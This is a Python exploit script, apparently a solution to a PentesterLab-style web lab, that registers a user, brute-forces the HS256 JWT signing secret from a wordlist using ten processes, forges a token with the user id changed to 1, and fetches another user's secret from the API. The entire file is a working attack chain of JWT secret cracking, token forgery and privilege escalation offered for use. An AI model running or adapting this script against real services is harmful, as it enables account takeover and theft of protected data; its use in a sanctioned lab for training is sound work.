import requests
import json
import hmac
import hashlib
import queue as q
import multiprocessing
import base64
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.lab_api_url = self.lab_url.replace('ptl', 'api-ptl')
        self.session = requests.Session()
        self.id = None
        self.token = None

    def signing_up(self):
        data = {
            'user': {
                'email': 'hacker@hacker.com',
                'password': 'Password123@',
                'username': 'hacker'
            }
        }
        response = self.session.post(self.lab_api_url + 'api/users', json=data)
        self.id = json.loads(response.text)['user']['id']
        self.token = json.loads(response.text)['user']['token']

    @staticmethod
    def generate_hs256_signature(secret_key, data):
        secret_key = bytes(secret_key, 'utf-8')
        data = bytes(data, 'utf-8')
        signature = hmac.new(secret_key, data, hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    def worker(self, queue, flag, signature, data, result_queue):
        while True:
            if not flag.value:
                try:
                    secret_key = queue.get_nowait()
                except q.Empty:
                    break
                else:
                    if self.generate_hs256_signature(secret_key, data) == signature:
                        flag.value = True
                        result_queue.put(secret_key)
            else:
                break

    @staticmethod
    def creating_queue():
        queue = multiprocessing.Queue()
        with open('/home/ma4747gh/Desktop/jwt.secrets.list') as f:
            for line in f.readlines():
                secret_key = line.strip()
                queue.put(secret_key)
        return queue

    def generating_malicious_token(self):
        token = self.token
        header, payload, signature = token.split('.')
        data = header + '.' + payload
        queue = self.creating_queue()
        result_queue = multiprocessing.Queue()
        flag = multiprocessing.Value('b', False)
        processes = []
        for i in range(10):
            process = multiprocessing.Process(target=self.worker, args=(queue, flag, signature, data, result_queue))
            processes.append(process)
            process.start()
        for process in processes:
            process.join()
        header += '=' * (len(payload) % 4)
        payload += '=' * (len(payload) % 4)
        header = base64.urlsafe_b64decode(header)
        header = base64.urlsafe_b64encode(header).rstrip(b'=')
        payload = base64.urlsafe_b64decode(payload)
        payload = payload.replace(str(self.id).encode(), b'1')
        payload = base64.urlsafe_b64encode(payload).rstrip(b'=')
        new_data = header.decode() + '.' + payload.decode()
        self.token = (header.decode() + '.' + payload.decode() + '.' + self.generate_hs256_signature(result_queue.get(), new_data))

    def printing_the_key(self):
        self.session.headers.update({'Authorization': f'Token {self.token}'})
        response = self.session.get(self.lab_api_url + 'api/secrets/1')
        print(json.loads(response.text)['secret']['name'] + ': ' + json.loads(response.text)['secret']['value'])

    def start(self):
        self.signing_up()
        self.generating_malicious_token()
        self.printing_the_key()


solver = Solver(sys.argv[1])
solver.start()
